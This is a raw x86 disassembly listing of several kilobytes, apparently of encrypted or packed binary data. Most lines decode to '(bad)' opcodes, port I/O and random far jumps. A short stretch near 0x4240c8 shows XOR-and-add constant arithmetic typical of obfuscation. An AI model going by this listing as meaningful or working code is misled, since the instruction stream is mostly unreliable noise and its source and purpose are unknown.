  4238f1:	fnsetpm(287 only) 
  4238f3:	hlt    
  4238f4:	or     BYTE PTR [esi],cl
  4238f6:	(bad)  
  4238f7:	push   cs
  4238f8:	add    esi,edx
  4238fa:	enter  0xa6f2,0xf6
  4238fe:	mov    ebp,0xceb5f3ee
  423903:	leave  
  423904:	repz mov ecx,0xe9ecb3eb
  42390a:	iret   
  42390b:	mov    ebx,0x401d007
  423910:	mov    ebp,0xe9fc05c7
  423915:	pop    es
  423916:	retf   
  423917:	pop    es
  423918:	jmp    0xe3b3:0xade6c9e2
  42391f:	fsub   st(1),st
  423921:	sti    
  423922:	iret   
  423923:	test   ch,0xd3
  423926:	int    0xf7
  423928:	repz repz mov ebx,0x1dc07fc
  42392f:	in     al,dx
  423930:	(bad)  
  423931:	sti    
  423932:	xlat   BYTE PTR ds:[ebx]
  423933:	fsubrp st(1),st
  423935:	(bad)  
  423936:	call   0xcd2f0910
  42393b:	retf   
  42393c:	in     eax,0xd0
  42393e:	jecxz  0x423916
  423940:	mov    bl,0xdb
  423942:	loope  0x423911
  423944:	out    dx,al
  423945:	(bad)  
  423947:	(bad)  
  423948:	int3   
  423949:	in     al,dx
  42394a:	mov    ecx,0x5f4ddf4
  42394f:	loope  0x423956
  423951:	(bad)  
  423952:	retf   
  423953:	aad    0x8
  423955:	in     eax,0xe5
  423957:	in     al,dx
  423958:	out    0xeb,al
  42395a:	or     esp,eax
  42395c:	into   
  42395d:	shl    al,0xd2
  423960:	call   0xb3182259
  423965:	mov    eax,0xd9bdb9d1
  42396a:	ret    
  42396b:	cli    
  42396c:	stc    
  42396d:	fdiv   st,st(2)
  42396f:	aad    0xf5
  423971:	or     ch,dl
  423973:	jmp    0xcbf8:0xf8eddde5
  42397a:	push   es
  42397b:	rep lods eax,DWORD PTR ds:[esi]
  42397d:	mov    dl,0xac
  42397f:	retf   
  423980:	rol    bl,0xec
  423983:	out    dx,eax
  423984:	xlat   BYTE PTR ds:[ebx]
  423985:	(bad)  
  423986:	out    dx,al
  423987:	ror    esp,cl
  423989:	enter  0xc8fc,0xf6
  42398d:	(bad)  
  42398f:	test   DWORD PTR ds:0xd0ddc5e3,0xc9c9caff
  423999:	loop   0x4239a4
  42399b:	into   
  42399c:	shl    al,cl
  42399e:	loop   0x42396d
  4239a0:	aad    0xc4
  4239a2:	out    0xcc,al
  4239a4:	out    dx,eax
  4239a5:	out    dx,al
  4239a6:	hlt    
  4239a7:	mov    esi,0xccdcddf9
  4239ac:	icebp  
  4239ad:	fnstcw WORD PTR [eax-0x16ff26fb]
  4239b3:	stc    
  4239b4:	loop   0x42399f
  4239b6:	sar    ah,0xc9
  4239b9:	cld    
  4239ba:	jmp    0xa4f5fa8e
  4239bf:	loopne 0x4239b7
  4239c1:	repz shl DWORD PTR [esi-0x3022e0d],0xf6
  4239c9:	call   0xe73209a2
  4239ce:	rcr    ebp,cl
  4239d0:	ret    0xcafd
  4239d3:	aam    0xe1
  4239d5:	(bad)
  4239d8:	out    0x5,eax
  4239da:	add    al,ch
  4239dc:	fsub   st(0),st
  4239de:	leave  
  4239df:	rep lods al,BYTE PTR ds:[esi]
  4239e1:	in     al,0xe6
  4239e3:	mov    ah,0xd1
  4239e5:	(bad)  
  4239e6:	rcr    ecx,cl
  4239e8:	fsincos 
  4239ea:	clc    
  4239eb:	fnstsw WORD PTR [edx-0x26fb4102]
  4239f1:	cmc    
  4239f2:	(bad)  
  4239f3:	xlat   BYTE PTR ds:[ebx]
  4239f4:	retf   
  4239f5:	or     ecx,ebp
  4239f7:	add    eax,0xe812cffa
  4239fc:	mov    esp,0xd2add0f7
  423a01:	fcomi  st,st(5)
  423a03:	sar    al,0xde
  423a06:	call   0x3fd35da
  423a0b:	stc    
  423a0c:	in     eax,dx
  423a0d:	fdiv   st(3),st
  423a0f:	rcr    al,0xf9
  423a12:	retf   
  423a13:	jmp    0xfd0e:0x2fa06be
  423a1a:	or     ch,dl
  423a1c:	mov    ebp,0xedefbee6
  423a21:	rol    al,0xc8
  423a24:	mov    ah,0xcc
  423a27:	retf   0xeab6
  423a2a:	mov    al,0xf5
  423a2c:	call   0xc52f2901
  423a31:	jecxz  0x423a0f
  423a33:	add    esp,esp
  423a35:	add    eax,0xf2ecfece
  423a3a:	in     eax,dx
  423a3b:	int    0xc1
  423a3d:	into   
  423a3e:	in     al,dx
  423a3f:	(bad)  
  423a40:	fcmovnb st,st(3)
  423a42:	jmp    0xcedd:0xcbf0e0c6
  423a49:	rol    DWORD PTR [ebx],1
  423a4b:	enter  0xd0f6,0xfc
  423a4f:	add    esi,ebx
  423a51:	out    0xc7,eax
  423a53:	lock lock std 
  423a56:	in     al,0xb
  423a58:	or     dh,cl
  423a5a:	int    0xef
  423a5c:	shl    ecx,1
  423a5e:	neg    ah
  423a60:	repnz mov al,0xe7
  423a63:	shl    ah,cl
  423a65:	in     al,dx
  423a66:	lods   al,BYTE PTR ds:[esi]
  423a67:	mov    bh,0xb8
  423a69:	rcr    esi,cl
  423a6b:	(bad)  
  423a6c:	icebp  
  423a6d:	int    0x6
  423a6f:	fdivrp st(1),st
  423a71:	sti    
  423a72:	add    eax,0xfadaf5d1
  423a77:	out    0xe4,al
  423a79:	fmulp  st(2),st
  423a7b:	fldcw  WORD PTR [eax-0x3f4c0857]
  423a81:	mov    al,0xd6
  423a83:	out    0xb5,eax
  423a85:	fadd   st,st(4)
  423a87:	jmp    0xded8:0xdbfbeabe
  423a8e:	fiadd  WORD PTR [ebx]
  423a90:	or     esp,esi
  423a92:	retf   0xfdc
  423a95:	out    dx,al
  423a96:	out    dx,al
  423a97:	(bad)  
  423a98:	fisttp QWORD PTR [eax]
  423a9a:	add    al,ah
  423a9c:	(bad)  
  423a9d:	loopne 0x423a5f
  423a9f:	rol    bl,0xb4
  423aa2:	mov    al,0xd1
  423aa4:	repz out dx,eax
  423aa6:	leave  
  423aa7:	lock dec edi
  423aaa:	icebp  
  423aab:	into   
  423aac:	xlat   BYTE PTR ds:[ebx]
  423aad:	shl    ebp,0xf1
  423ab0:	shl    ebx,0xea
  423ab3:	clc    
  423ab4:	enter  0xdb0e,0xee
  423ab8:	in     al,dx
  423ab9:	rcr    esp,0xc6
  423abc:	fadd   st(0),st
  423abe:	test   al,0xef
  423ac0:	mov    cl,0xec
  423ac2:	(bad)
  423ac5:	(bad)  
  423ac7:	xlat   BYTE PTR ds:[ebx]
  423ac8:	(bad)  
  423aca:	repz shl eax,cl
  423acd:	ret    0xecfd
  423ad0:	fsubr  st(4),st
  423ad2:	std    
  423ad3:	lock (bad) 
  423ad6:	in     al,0xe9
  423ad8:	or     eax,edi
  423ada:	or     eax,ebx
  423adc:	mov    cl,0xe5
  423ade:	shr    ch,1
  423ae0:	mov    esp,0xf1ced7c2
  423ae5:	in     al,0xed
  423ae7:	in     eax,0xfa
  423ae9:	mov    eax,0x1babbf7
  423aee:	rol    bh,cl
  423af0:	mov    esi,0xc2ebe6c6
  423af5:	add    eax,0xdf30c08
  423afa:	clc    
  423afb:	rcr    esp,1
  423afd:	mov    cl,0xc5
  423aff:	(bad)  
  423b00:	loopne 0x423ace
  423b02:	into   
  423b03:	leave  
  423b04:	leave  
  423b05:	mov    edx,0xd5fbd1df
  423b0a:	ret    0xfbfd
  423b0d:	stc    
  423b0e:	cld    
  423b0f:	fcmovnb st,st(7)
  423b11:	mov    ecx,0xe402c2d4
  423b16:	fdiv   st,st(4)
  423b18:	out    0xc,al
  423b1a:	(bad)  
  423b1b:	out    dx,al
  423b1c:	jmp    0xea152603
  423b21:	jecxz  0x423af7
  423b23:	mov    dh,0xb7
  423b25:	clc    
  423b26:	mov    ecx,0xe8e3bcfa
  423b2b:	(bad)  
  423b2d:	sar    BYTE PTR [esp+edi*4-0x222a180d],1
  423b34:	(bad)  
  423b36:	cmc    
  423b37:	retf   0x1fd
  423b3a:	loopne 0x423b25
  423b3c:	fdivrp st(7),st
  423b3e:	aad    0xc3
  423b40:	jmp    0x423aef
  423b42:	cmc    
  423b43:	out    0xd8,al
  423b45:	cli    
  423b46:	std    
  423b47:	fdiv   DWORD PTR [ebp-0x3f2e2d16]
  423b4d:	mov    esi,0xe0e4ccc1
  423b52:	add    al,al
  423b54:	(bad)  
  423b55:	fld    QWORD PTR [edi]
  423b57:	fsubrp st(5),st
  423b59:	or     cl,bl
  423b5b:	mov    esp,0xeaefdeef
  423b60:	mov    cl,0xd3
  423b62:	hlt    
  423b63:	retf   
  423b64:	in     al,dx
  423b65:	retf   
  423b66:	repz div DWORD PTR [ebp-0x23fd3310]
  423b6d:	ret    
  423b6e:	sar    DWORD PTR [edi-0x3e0715],1
  423b74:	aam    0xdb
  423b76:	(bad)  
  423b77:	or     al,ch
  423b79:	or     bl,dl
  423b7b:	stos   BYTE PTR es:[edi],al
  423b7c:	lods   eax,DWORD PTR ds:[esi]
  423b7d:	in     al,dx
  423b7e:	call   0xc828fe4a
  423b83:	mov    ch,0xea
  423b85:	jmp    0xd70d0e7f
  423b8a:	cmc    
  423b8b:	clc    
  423b8c:	loop   0x423b6f
  423b8e:	mov    ebp,0xffe3e7bd
  423b93:	(bad)  
  423b94:	xlat   BYTE PTR ds:[ebx]
  423b95:	std    
  423b96:	jecxz  0x423b63
  423b98:	iret   
  423b99:	add    eax,0xd6ebc4e0
  423b9e:	enter  0xd4ef,0xf1
  423ba2:	out    dx,al
  423ba3:	mov    ebx,0xcfacf2eb
  423ba8:	jmp    0xfdd4:0xcd0302b4
  423baf:	rcr    edi,1
  423bb1:	sti    
  423bb2:	aad    0xfa
  423bb4:	add    BYTE PTR [edi],al
  423bb6:	or     bl,bh
  423bb8:	jecxz  0x423ba0
  423bba:	(bad)  
  423bbc:	mov    esi,0xc8ecedc2
  423bc1:	loop   0x423b88
  423bc3:	call   0xe51e1a76
  423bc8:	ror    esi,cl
  423bca:	(bad)  
  423bcb:	add    esi,esp
  423bcd:	add    DWORD PTR [ebp+0x6def9ed],edi
  423bd3:	fmul   st(1),st
  423bd5:	les    ecx,FWORD PTR [ecx]
  423bd7:	retf   0xf2fa
  423bda:	in     eax,0xe9
  423bdc:	out    0xe0,al
  423bde:	shl    DWORD PTR [eax-0x3904241f],cl
  423be4:	(bad)  
  423be5:	out    dx,al
  423be6:	mov    ebx,0xf4dddcdc
  423beb:	mov    edx,0xe7b8c3b8
  423bf0:	stc    
  423bf1:	jmp    0xe4d9:0xeebf1c1
  423bf8:	lds    ecx,FWORD PTR [ecx]
  423bfa:	in     al,dx
  423bfb:	into   
  423bfc:	enter  0xc7f6,0xb0
  423c00:	mov    al,0xf5
  423c02:	in     eax,0xf6
  423c04:	fucomip st,st(7)
  423c06:	in     al,dx
  423c07:	dec    edi
  423c09:	add    ebx,ebp
  423c0b:	add    ebx,eax
  423c0d:	shl    bh,cl
  423c0f:	cld    
  423c10:	aad    0xbc
  423c12:	add    cl,bl
  423c14:	add    ebp,eax
  423c16:	leave  
  423c17:	loop   0x423c1a
  423c19:	clc    
  423c1a:	add    al,0xec
  423c1c:	mov    dl,0xd6
  423c1e:	loop   0x423be9
  423c20:	repnz mov ch,0xc6
  423c23:	sar    ecx,1
  423c25:	int3   
  423c26:	hlt    
  423c27:	iret   
  423c28:	(bad)  
  423c29:	sar    DWORD PTR [edi-0x1321473e],cl
  423c2f:	loope  0x423c32
  423c31:	jmp    0x4f8:0xc4f5caf4
  423c38:	push   cs
  423c39:	push   es
  423c3a:	in     eax,dx
  423c3b:	mov    bl,0xc2
  423c3d:	retf   
  423c3e:	ret    0xb5d3
  423c41:	jmp    0xf4cc:0xbabacac8
  423c48:	clc    
  423c49:	jmp    0xbbe3:0xeff203f0
  423c50:	rol    eax,cl
  423c52:	fadd   st(2),st
  423c54:	aad    0xe8
  423c56:	out    0xdb,al
  423c58:	fmul   QWORD PTR [edx]
  423c5a:	add    eax,eax
  423c5c:	shr    ch,1
  423c5e:	lods   eax,DWORD PTR ds:[esi]
  423c5f:	repnz enter 0xebed,0xe8
  423c64:	out    0xd3,eax
  423c66:	(bad)  
  423c67:	mov    edx,0xb7d8dbd5
  423c6c:	mov    edx,0xc1d5dbf9
  423c71:	fld    DWORD PTR [ecx]
  423c73:	or     al,BYTE PTR [edx]
  423c75:	jmp    0xeb2a2659
  423c7a:	add    DWORD PTR [ebx-0x36321a32],ebp
  423c80:	imul   bl
  423c82:	mov    al,0xd8
  423c84:	mov    ch,0xe7
  423c86:	stc    
  423c87:	shr    ebp,1
  423c89:	jmp    0xd7383d4d
  423c8e:	sar    DWORD PTR [ebx-0x21382014],1
  423c94:	stc    
  423c95:	call   0x8413295
  423c9a:	leave  
  423c9b:	loopne 0x423c79
  423c9d:	mov    esi,0xdbcbe5e9
  423ca2:	in     al,dx
  423ca3:	clc    
  423ca4:	mov    dh,0xeb
  423ca6:	dec    edx
  423ca8:	call   0xbb200689
  423cad:	stc    
  423cae:	mov    ebp,0xe905f0f9
  423cb3:	test   DWORD PTR [edx],0xfdceeac5
  423cb9:	push   cs
  423cba:	(bad)  
  423cbc:	fnsave [edx-0x41c2e44]
  423cc2:	mov    cl,0xe6
  423cc4:	mov    ch,0xb0
  423cc6:	(bad)  
  423cc8:	ror    esi,1
  423cca:	mov    eax,0xf6d0e3e8
  423ccf:	in     eax,0xda
  423cd1:	icebp  
  423cd2:	add    bh,al
  423cd4:	cld    
  423cd5:	out    dx,eax
  423cd6:	loopne 0x423cad
  423cd8:	jmp    0x423cd6
  423cda:	or     eax,0xc7d7afe5
  423cdf:	aam    0xad
  423ce1:	aam    0xeb
  423ce3:	leave  
  423ce4:	mov    ebx,0xd1b9eada
  423ce9:	aad    0xde
  423ceb:	(bad)  
  423ced:	sti    
  423cee:	mov    esp,0xddc0d4d1
  423cf3:	out    0xc8,eax
  423cf5:	cld    
  423cf6:	hlt    
  423cf7:	enter  0x5c9,0xee
  423cfb:	out    dx,al
  423cfc:	test   al,0xc6
  423cfe:	shl    BYTE PTR [ebx-0x624354d],cl
  423d04:	jmp    0xb8e2:0xb2b4d6ec
  423d0b:	mov    bh,0xbc
  423d0d:	clc    
  423d0e:	idiv   bh
  423d10:	fdivr  st(1),st
  423d12:	retf   0xd7fb
  423d15:	iret   
  423d16:	add    ebx,eax
  423d18:	adc    ebp,edi
  423d1a:	(bad)  
  423d1c:	imul   esi
  423d1e:	lods   al,BYTE PTR ds:[esi]
  423d1f:	out    dx,al
  423d20:	in     al,0xdb
  423d22:	test   ebx,0xfdf3d0f4
  423d28:	fstp   st(1)
  423d2a:	idiv   BYTE PTR [ebx-0xd3d1344]
  423d30:	add    ah,cl
  423d32:	clc    
  423d33:	out    0xd6,al
  423d35:	fdivrp st(5),st
  423d37:	inc    DWORD PTR [edi]
  423d39:	fst    DWORD PTR [ebx]
  423d3b:	out    0xed,eax
  423d3d:	mov    edi,0xf4c3ebbe
  423d42:	loope  0x423d3b
  423d44:	sti    
  423d45:	enter  0xe8d9,0xd5
  423d49:	enter  0xf9db,0xe1
  423d4d:	mov    edi,0xf5d5bd
  423d52:	lock leave 
  423d54:	(bad)  
  423d56:	(bad)  
  423d57:	call   0xcb4e3a59
  423d5c:	repz repz rol ah,cl
  423d60:	loope  0x423d19
  423d62:	(bad)  
  423d63:	fxch   st(6)
  423d65:	icebp  
  423d66:	in     al,0xdb
  423d68:	fnstcw WORD PTR [eax+edi*4-0x13410e38]
  423d6f:	cli    
  423d70:	rol    DWORD PTR [edi],cl
  423d72:	xlat   BYTE PTR ds:[ebx]
  423d73:	(bad)  
  423d74:	(bad)  
  423d75:	fcomp  st(0)
  423d77:	add    al,0xcf
  423d79:	fcmove st,st(2)
  423d7b:	mov    eax,0xcccbdcd0
  423d80:	mov    dh,0xb3
  423d82:	lods   al,BYTE PTR ds:[esi]
  423d83:	mov    bh,0xf7
  423d85:	xlat   BYTE PTR ds:[ebx]
  423d86:	mov    edx,0xfdfbdaec
  423d8b:	into   
  423d8c:	loopne 0x423d7b
  423d8e:	cli    
  423d8f:	ret    
  423d90:	in     eax,0x6
  423d92:	(bad)  
  423d93:	retf   
  423d94:	out    0xf4,al
  423d96:	iret   
  423d97:	or     eax,DWORD PTR [edi]
  423d99:	(bad)  
  423d9b:	(bad)  
  423d9c:	mov    ebp,0xcfddf3e9
  423da1:	lods   eax,DWORD PTR ds:[esi]
  423da2:	(bad)  
  423da3:	fdiv   st,st(0)
  423da5:	mov    cl,0xeb
  423da7:	mov    dh,0xf8
  423da9:	call   0xf4051d67
  423dae:	inc    DWORD PTR [esi]
  423db0:	sar    cl,1
  423db2:	(bad)  
  423db4:	add    eax,0xdcf5bce8
  423db9:	push   es
  423dba:	retf   
  423dbb:	mov    dl,0xf0
  423dbd:	test   eax,0xe8b0e4c0
  423dc2:	(bad)  
  423dc3:	shl    edi,1
  423dc5:	lock cmc 
  423dc7:	jmp    0xefc3:0xe203d4d7
  423dce:	pop    es
  423dcf:	(bad)  
  423dd0:	jecxz  0x423da2
  423dd2:	fisttp DWORD PTR [ebx]
  423dd4:	sti    
  423dd5:	inc    ebp
  423dd7:	in     al,0xb
  423dd9:	pop    es
  423dda:	or     al,0xcc
  423ddc:	scas   al,BYTE PTR es:[edi]
  423ddd:	div    DWORD PTR [esi-0x181c0a44]
  423de3:	hlt    
  423de4:	out    0xb7,eax
  423de6:	fcmovu st,st(4)
  423de8:	icebp  
  423de9:	repz sar ecx,cl
  423dec:	rcl    ch,cl
  423dee:	loopne 0x423dc3
  423df0:	std    
  423df1:	idiv   ebp
  423df3:	(bad)  
  423df5:	loopne 0x423dfa
  423df7:	(bad)
  423dfa:	leave  
  423dfb:	test   al,0xca
  423dfd:	les    esi,FWORD PTR [ebx-0xd100f3c]
  423e03:	int    0xbb
  423e05:	hlt    
  423e06:	call   eax
  423e08:	enter  0xb0ce,0xd3
  423e0c:	repz mov esi,0xfad4ddc2
  423e12:	in     eax,0xfa
  423e14:	loope  0x423e17
  423e16:	fmul   st(7),st
  423e18:	repz push es
  423e1a:	(bad)  
  423e1c:	in     al,dx
  423e1d:	retf   
  423e1e:	(bad)  
  423e1f:	cmc    
  423e20:	fdiv   QWORD PTR [esi-0x7483620]
  423e26:	(bad)  
  423e27:	mov    bh,0xbb
  423e29:	fcmovnu st,st(3)
  423e2b:	mov    ebp,0xdad2ccbf
  423e30:	in     al,dx
  423e31:	out    0xd2,al
  423e33:	or     ebp,ebx
  423e35:	add    edx,ebx
  423e37:	add    al,0x1
  423e39:	cld    
  423e3a:	bnd jmp 0xb30b1e06
  423e40:	lods   eax,DWORD PTR ds:[esi]
  423e41:	int3   
  423e42:	out    0xb2,eax
  423e44:	push   esi
  423e46:	shl    BYTE PTR [ebx-0x361d2b27],cl
  423e4c:	(bad)  
  423e4e:	shl    bh,1
  423e50:	in     al,0xc6
  423e52:	std    
  423e53:	icebp  
  423e54:	add    eax,DWORD PTR [ebx]
  423e56:	iret   
  423e57:	jmp    0x423e22
  423e59:	loopne 0x423e48
  423e5b:	fucom  st(4)
  423e5d:	int    0xc4
  423e5f:	fnsave [ebx-0xe4a103e]
  423e65:	into   
  423e66:	aam    0xe9
  423e68:	repnz out dx,al
  423e6a:	loop   0x423e68
  423e6c:	rcr    al,1
  423e6e:	ret    0xf5fc
  423e71:	lock loopne 0x423e48
  423e74:	cli    
  423e75:	(bad)  
  423e77:	aam    0xfd
  423e79:	int    0x13
  423e7b:	ffree  st(6)
  423e7d:	shl    edi,1
  423e7f:	retf   
  423e80:	fdiv   QWORD PTR [ecx-0x2f19280b]
  423e86:	fld1   
  423e88:	leave  
  423e89:	mov    esp,0xc3d3f1c9
  423e8e:	std    
  423e8f:	loope  0x423e93
  423e91:	in     eax,0xd2
  423e93:	(bad)  
  423e95:	loop   0x423e96
  423e97:	or     eax,0xe3df00c2
  423e9c:	mov    edi,0xefe8bdae
  423ea1:	mov    bh,0xd9
  423ea3:	sti    
  423ea4:	fldz   
  423ea6:	enter  0xd0f6,0xeb
  423eaa:	fcomip st,st(7)
  423eac:	test   ebp,0xfc06f1f2
  423eb2:	cmc    
  423eb3:	not    esp
  423eb5:	call   0xc22528b0
  423eba:	or     BYTE PTR [ecx-0x816182d],dh
  423ec0:	in     al,0xf0
  423ec2:	in     eax,dx
  423ec3:	hlt    
  423ec4:	mov    esp,0xeab6f6c6
  423eca:	stc    
  423ecb:	mov    edx,0xecc1f6f3
  423ed0:	loop   0x423eca
  423ed2:	push   es
  423ed3:	(bad)  
  423ed5:	cli    
  423ed6:	out    dx,eax
  423ed7:	loop   0x423ee2
  423ed9:	pop    es
  423eda:	jmp    0xeaf2119e
  423edf:	lods   al,BYTE PTR ds:[esi]
  423ee0:	shl    cl,1
  423ee2:	mov    bl,0xd2
  423ee4:	idiv   BYTE PTR [ebx-0x40110c13]
  423eea:	in     al,dx
  423eeb:	neg    bl
  423eed:	clc    
  423eee:	(bad)  
  423eef:	(bad)  
  423ef1:	(bad)
  423ef4:	or     edx,esi
  423ef6:	push   cs
  423ef7:	mov    ebp,0xc4a70def
  423efd:	mov    cl,0xa8
  423eff:	repnz enter 0xb3c0,0xc4
  423f04:	retf   
  423f05:	lock mov eax,0xf902dbd8
  423f0b:	rcr    edi,0xfd
  423f0e:	add    eax,0xd5f3f2f6
  423f13:	aad    0xc9
  423f15:	add    BYTE PTR ds:0xca04dde9,cl
  423f1b:	shr    dh,cl
  423f1d:	mov    bl,0xe4
  423f1f:	jmp    0xc5c7:0xfbc2f0eb
  423f26:	jmp    0xfa4227f9
  423f2b:	clc    
  423f2c:	shl    ebx,cl
  423f2e:	lock shl esp,cl
  423f31:	clc    
  423f32:	add    eax,0xdfda010a
  423f37:	(bad)  
  423f38:	(bad)  
  423f3a:	fcomip st,st(2)
  423f3c:	mov    al,0xbe
  423f3e:	mov    ebp,0xd2d5e3ab
  423f43:	call   0xe02e2514
  423f48:	jmp    0xe2382319
  423f4d:	push   es
  423f4e:	(bad)  
  423f50:	mov    esp,0xddf4faf8
  423f56:	jmp    0x423f65
  423f58:	or     al,0xfc
  423f5a:	retf   0xc8c3
  423f5d:	lods   eax,DWORD PTR ds:[esi]
  423f5e:	(bad)  
  423f5f:	hlt    
  423f60:	enter  0xb2d5,0xf4
  423f64:	rcl    edi,cl
  423f66:	jmp    0x423f3f
  423f68:	icebp  
  423f69:	cld    
  423f6a:	jecxz  0x423f2e
  423f6c:	loopne 0x423f42
  423f6e:	add    ah,bh
  423f70:	(bad)  
  423f72:	loop   0x423f75
  423f74:	out    dx,eax
  423f75:	in     al,0xe5
  423f77:	sti    
  423f78:	out    dx,eax
  423f79:	stc    
  423f7a:	loope  0x423f3c
  423f7c:	jmp    0xe5c4:0xcbb5becd
  423f83:	hlt    
  423f84:	sar    DWORD PTR [ecx-0xa084629],cl
  423f8a:	out    dx,eax
  423f8b:	mov    ecx,0xd0f801dc
  423f90:	fadd   st(2),st
  423f92:	fdivrp st(4),st
  423f94:	in     eax,0xdb
  423f96:	push   cs
  423f97:	add    bh,ah
  423f99:	in     al,0xb
  423f9b:	shr    bh,0xe6
  423f9e:	aad    0xed
  423fa0:	cmc    
  423fa1:	aam    0xc8
  423fa3:	int3   
  423fa4:	lock (bad) 
  423fa6:	shl    BYTE PTR [edi-0x331d062d],1
  423fac:	ret    
  423fad:	add    al,BYTE PTR ds:0xe2fae5c3
  423fb3:	std    
  423fb4:	mov    BYTE PTR [edi],0xd
  423fb7:	inc    DWORD PTR [ebx]
  423fb9:	loopne 0x423f9c
  423fbb:	jmp    0xc2ec:0xd5f3c0b0
  423fc2:	mov    cl,0xf1
  423fc4:	in     eax,0xb4
  423fc6:	mov    edi,0xd8e9f6d4
  423fcb:	fsub   st,st(3)
  423fcd:	mov    eax,0xe1e004db
  423fd2:	out    0xfc,al
  423fd4:	mul    bl
  423fd6:	jecxz  0x423fb3
  423fd8:	loop   0x423fcc
  423fda:	int3   
  423fdb:	iret   
  423fdc:	stos   BYTE PTR es:[edi],al
  423fdd:	call   0xb31deda8
  423fe2:	into   
  423fe3:	mov    ah,0xf9
  423fe5:	retf   
  423fe6:	mov    eax,0x3d8b8eb
  423feb:	stc    
  423fec:	sti    
  423fed:	fadd   QWORD PTR [ebx]
  423fef:	aam    0xc0
  423ff1:	add    BYTE PTR ds:0xd0207de,al
  423ff7:	fmul   st(4),st
  423ff9:	ficom  WORD PTR [ebx]
  423ffb:	jmp    0xd00305e8
  424000:	jmp    0xd6e8:0xb7b0e8b2
  424007:	not    ah
  424009:	xlat   BYTE PTR ds:[ebx]
  42400a:	hlt    
  42400b:	fdiv   st(2),st
  42400d:	(bad)  
  42400e:	sti    
  42400f:	fadd   DWORD PTR ds:0xfdddf201
  424015:	in     al,0xde
  424017:	push   es
  424018:	push   cs
  424019:	add    dl,bl
  42401b:	lods   eax,DWORD PTR ds:[esi]
  42401c:	ret    0xd6c7
  42401f:	not    dl
  424021:	in     al,0xe7
  424023:	in     al,dx
  424024:	repnz out 0xea,al
  424027:	icebp  
  424028:	fcmovu st,st(4)
  42402a:	(bad)  
  42402b:	mov    esp,0xf107e3e0
  424030:	rol    ah,cl
  424032:	push   es
  424033:	(bad)  
  424035:	loopne 0x424018
  424037:	(bad)  
  424038:	(bad)  
  424039:	(bad)  
  42403b:	lock (bad) 
  42403e:	loopne 0x42402c
  424040:	mov    bl,0xf2
  424042:	mov    dh,0xca
  424044:	(bad)  
  424045:	fcmovnb st,st(6)
  424047:	int    0xd4
  424049:	mov    esp,0xcc00ced0
  42404e:	call   esi
  424050:	cld    
  424051:	fisttp WORD PTR [ebx]
  424053:	mov    esp,0xcbd9e7cf
  424059:	or     ch,ch
  42405b:	mov    esi,0xc9e9c4e9
  424060:	icebp  
  424061:	shl    esp,1
  424063:	mov    dh,0xfa
  424065:	fdivr  st,st(7)
  424067:	ror    ebx,cl
  424069:	jecxz  0x424026
  42406b:	add    cl,ah
  42406d:	fst    st(5)
  42406f:	sar    ah,1
  424071:	(bad)  
  424072:	(bad)  
  424073:	xlat   BYTE PTR ds:[ebx]
  424074:	(bad)  
  424075:	fmul   DWORD PTR [ebx]
  424077:	cli    
  424078:	into   
  424079:	retf   0xef02
  42407c:	jecxz  0x424075
  42407e:	(bad)  
  424080:	loopne 0x424069
  424082:	mov    bh,0xf0
  424084:	sti    
  424085:	mov    bh,0xf7
  424087:	fnstsw WORD PTR [edx-0x46161130]
  42408d:	in     eax,dx
  42408e:	(bad)  
  424090:	xlat   BYTE PTR ds:[ebx]
  424091:	aad    0xd0
  424093:	retf   
  424094:	pmullw mm1,mm0
  424097:	or     eax,DWORD PTR [ebx]
  424099:	jmp    0x4240a4
  42409b:	repz shl BYTE PTR [edi-0x3d1e153a],cl
  4240a2:	mov    cl,0xfb
  4240a5:	(bad)  
  4240a6:	lock (bad) [edx-0x12070d06]
  4240ad:	mov    edi,0xf8f4e4f0
  4240b2:	add    cl,BYTE PTR [ebx]
  4240b4:	or     ebp,ebx
  4240b6:	fucomp st(6)
  4240b8:	faddp  st(4),st
  4240ba:	iret   
  4240bb:	ret    0xe3bd
  4240be:	jmp    0x424097
  4240c0:	fucomi st,st(2)
  4240c2:	cmc    
  4240c3:	out    dx,eax
  4240c4:	aam    0xd9
  4240c6:	repnz iret 
  4240c8:	mov    esi,0x8b535fe
  4240cd:	push   ecx
  4240ce:	pop    es
  4240cf:	add    eax,0x3272fb
  4240d4:	mov    DWORD PTR [ebp-0x80],eax
  4240d7:	jmp    0x4240f1
  4240dc:	mov    eax,DWORD PTR [ebp+0xc]
  4240df:	xor    eax,0x75108b5
  4240e4:	mov    ecx,DWORD PTR [ebp-0x80]
  4240e7:	lea    eax,[ecx+eax*1+0x3272fb]
  4240ee:	mov    DWORD PTR [ebp-0x80],eax
  4240f1:	mov    eax,DWORD PTR [ebp-0x80]
  4240f4:	jmp    0x42649a
  4240f9:	sub    BYTE PTR [edx+esi*4+0x3a],bl
  4240fd:	not    BYTE PTR [eax+esi*2+0x6c]
  424101:	push   esi
  424102:	je     0x4240ee
  424104:	hlt    
  424105:	sub    bp,sp
  424108:	(bad)  
  424109:	in     al,0x64
  42410b:	jp     0x424188
  42410d:	add    bl,BYTE PTR [eax-0xf028485]
  424113:	fdiv   st,st(6)
  424115:	ret    
  424116:	(bad)  
  424118:	rcr    dh,1
  42411a:	shl    edi,1
  42411c:	call   0xed1b26f7
  424121:	add    eax,0xf7e7e8e3
  424126:	iret   
  424127:	repnz jecxz 0x4240fe
  42412a:	enter  0xd8c7,0xff
  42412e:	int3   
  42412f:	(bad)  
  424130:	aam    0xcc
  424132:	in     al,dx
  424133:	mov    esp,0xd2f5ede1
  424138:	add    ebp,edi
  42413a:	mov    edi,0xdcfcd4d7
  42413f:	fstp   st(3)
  424141:	or     dh,dl
  424143:	retf   
  424144:	jecxz  0x42410f
  424146:	shl    dl,1
  424148:	ret    0xf7b5
  42414b:	jmp    0xe5321924
  424150:	cli    
  424151:	add    cl,ch
  424153:	cmc    
  424154:	out    dx,eax
  424155:	int    0xf7
  424157:	loope  0x42415f
  424159:	in     al,0xfa
  42415b:	fiadd  DWORD PTR [edi]
  42415d:	(bad)  
  42415e:	out    0xcb,eax
  424160:	fprem  
  424162:	(bad)  
  424163:	in     al,dx
  424164:	repz mov bl,0xf5
  424167:	mov    dh,0xfb
  424169:	shl    DWORD PTR [edi-0x35414a27],1
  42416f:	call   0xda3d3a6a
  424174:	add    bh,cl
  424176:	sti    
  424177:	repz (bad) 
  424179:	retf   
  42417a:	(bad)
  42417d:	retf   
  42417e:	cli    
  42417f:	std    
  424180:	cli    
  424181:	in     eax,dx
  424182:	out    dx,eax
  424183:	repnz (bad) 
  424185:	test   al,0xd4
  424187:	ret    
  424188:	mov    al,0xf4
  42418a:	into   
  42418b:	jmp    0xef1a1155
  424190:	test   edx,0x1e6eef4
